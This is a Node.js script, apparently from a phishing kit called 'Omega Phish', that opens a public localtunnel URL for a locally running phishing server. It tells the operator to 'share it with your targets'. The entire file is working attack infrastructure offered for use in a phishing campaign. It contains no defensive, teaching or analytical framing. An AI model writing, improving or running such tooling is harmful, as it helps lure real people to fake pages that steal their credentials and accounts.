// Standalone script to get public URL for phishing server
// Run this AFTER starting the phishing server in Omega Phish

const localtunnel = require('localtunnel');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('='.repeat(60));
console.log('OMEGA PHISH - PUBLIC URL GENERATOR');
console.log('='.repeat(60));
console.log('');

rl.question('Enter the port number (default: 8080): ', async (answer) => {
    const port = answer.trim() || '8080';

    console.log('');
    console.log(`Starting public tunnel for port ${port}...`);
    console.log('Please wait...');
    console.log('');

    try {
        const tunnel = await localtunnel({ port: parseInt(port) });

        console.log('✅ SUCCESS!');
        console.log('');
        console.log('='.repeat(60));
        console.log('PUBLIC URL:', tunnel.url);
        console.log('='.repeat(60));
        console.log('');
        console.log('Copy this URL and share it with your targets!');
        console.log('The URL will stay active as long as this script is running.');
        console.log('');
        console.log('Press Ctrl+C to stop the tunnel.');
        console.log('');

        tunnel.on('close', () => {
            console.log('Tunnel closed.');
            process.exit(0);
        });

    } catch (error) {
        console.error('❌ FAILED!');
        console.error('Error:', error.message);
        process.exit(1);
    }

    rl.close();
});
